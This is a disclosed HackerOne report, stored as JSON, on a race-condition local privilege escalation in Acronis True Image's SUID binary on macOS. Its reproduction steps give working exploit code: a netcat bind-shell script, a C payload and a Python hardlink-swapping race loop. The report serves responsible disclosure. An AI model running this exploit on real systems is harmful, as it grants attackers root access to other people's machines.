{
  "id": 1251464,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjUxNDY0",
  "url": "https://hackerone.com/reports/1251464",
  "title": "Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-07-05T03:49:58.205Z",
  "submitted_at": "2021-07-05T03:49:58.358Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vkas-afk",
    "url": "/vkas-afk",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTU3NDY3MCwicHVyIjoiYmxvYl9pZCJ9fQ==--43bd101dbc2c6e164b316788033a3d749fd1edf5/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/6U2LrP_n_400x400.jpg"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13428,
    "url": "https://hackerone.com/acronis",
    "handle": "acronis",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Acronis",
      "twitter_handle": "Acronis",
      "website": "https://www.acronis.com",
      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-07-28T10:32:00.943Z",
  "bug_reporter_agreed_on_going_public_at": "2022-07-28T10:32:00.871Z",
  "team_member_agreed_on_going_public_at": "2022-07-12T17:23:50.295Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\nThe Acronis True Image application has a SUID binary \"Acronis True Image\" that starts another binary \"console\" in the same directory. The SUID binary does some checks on \"console\" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load \"console\" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock \"console\" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the \"console\" binary **after** it has been checked but **before** it has been run. If we win this race we gain code execution as root from an admin account. \n\n## Steps To Reproduce\nfirst we make the shell command to run \n```bash\necho \"mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1\" > shell \n```\nnow lets make the c program that will run this shell command naming it test.c\n```c\n#include <stdlib.h>\nint main() \n{\n\tsystem(\"touch pass;bash shell\");\n\treturn 0;\n}\n```\ncompile the program\n```bash\ngcc test.c \n```\nrun the following python program\n```python\nimport os \nimport time \n\nos.link(\"/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image\", \"./run\")\nos.link(\"/Applications/Acronis True Image.app/Contents/MacOS/console\", \"./console\")\n\nlag = 0.01 \nwhile True: \n\tos.popen(\"./run\")\n\ttime.sleep(lag)\n\tos.unlink(\"./console\")\n\tos.link(\"./a.out\", \"./console\")\n\ttime.sleep(1.0)\n\tos.unlink(\"./console\")\n\tos.link(\"Applications/Acronis True Image.app/Contents/MacOS/console\", \"./console\")\n\tlag += 0.01 \n\tif os.path.exists(\"./pass\"):\n\t\texit()\n```\nconnect to the root shell\n```bash\nnc 127.0.0.1 8080\n```\n## Recommendations\nAny binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.\n\n## Impact\n\nLocal privilege escalation to root.",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 7,
  "voters": [
    "drsniper",
    "zy9ard3",
    "pr0f0x01",
    "shivammusic",
    "riyansh2103",
    "ultran00b",
    "l1g8t"
  ],
  "severity": {
    "rating": "high",
    "score": 7.4,
    "author_type": "User",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 50772,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "Acronis Cyber Protect Home Office (formerly Acronis True Image)",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
